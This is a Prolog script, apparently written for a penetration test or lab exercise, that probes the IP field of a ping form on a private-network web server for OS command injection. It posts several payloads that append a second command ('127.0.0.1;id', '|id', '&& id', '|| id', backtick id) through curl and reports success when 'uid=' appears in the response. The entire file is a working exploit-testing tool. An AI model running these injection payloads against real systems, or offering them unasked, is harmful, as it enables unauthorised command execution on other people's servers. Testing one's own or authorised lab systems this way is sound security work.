
/* 
   Module: ping_command_injection_test
   Purpose: Test for OS command injection in the IP ping field of http://192.168.1.112/index.php
   Approach: Sends input such as 127.0.0.1;id in the ip parameter and checks if system command output is present in the server response.
   Tools: Uses curl to post crafted payloads and analyzes the response.
   Customization:
    - You can edit the 'TargetUrl' or the POST field name ('ip') as needed.
    - You can add more payload variations in 'injection_payloads/1'.
*/

:- module(ping_command_injection_test, [run_exploit/0]).
:- use_module(library(process)).
:- use_module(library(readutil)).
:- use_module(library(lists)).

% Target information: edit as necessary
target_url('http://192.168.1.112/index.php').
post_field('ip').

% Injection payloads to try (add more as needed)
injection_payloads([
    '127.0.0.1;id',
    '127.0.0.1|id',
    '127.0.0.1 && id',
    '127.0.0.1 || id',
    '127.0.0.1`id`'
]).

% Indicator strings to detect successful command execution
indicator_strings([
    'uid=',
    'gid=',
    'groups='
]).

run_exploit :-
    target_url(URL),
    post_field(Field),
    injection_payloads(Payloads),
    format('Testing command injection in ~w via POST to ~w~n', [Field, URL]),
    test_payloads(URL, Field, Payloads).

test_payloads(_, _, []) :-
    format('No payloads left to test or no injection detected.~n', []).
test_payloads(URL, Field, [Payload|Rest]) :-
    format('Testing payload: "~w"~n', [Payload]),
    build_post_data(Field, Payload, PostData),
    run_curl(URL, PostData, Output),
    (   is_vulnerable(Output)
    ->  format('[!!] Possible command injection detected with payload: ~w~n', [Payload]),
        format('[!!] Extracted response:~n~s~n', [Output])
    ;   test_payloads(URL, Field, Rest)
    ).

build_post_data(Field, Payload, PostData) :-
    format(string(PostData), "~w=~w", [Field, Payload]).

run_curl(URL, PostData, Output) :-
    process_create(path(curl), 
        ['-s', '-X', 'POST', '-d', PostData, URL], 
        [stdout(pipe(Out)), process(PID)]),
    read_stream_to_codes(Out, Codes),
    close(Out),
    process_wait(PID, _),
    Output = Codes.

is_vulnerable(OutputCodes) :-
    indicator_strings(Indicators),
    string_codes(OutputStr, OutputCodes),
    member(Indicator, Indicators),
    sub_string(OutputStr, _, _, _, Indicator), !.
`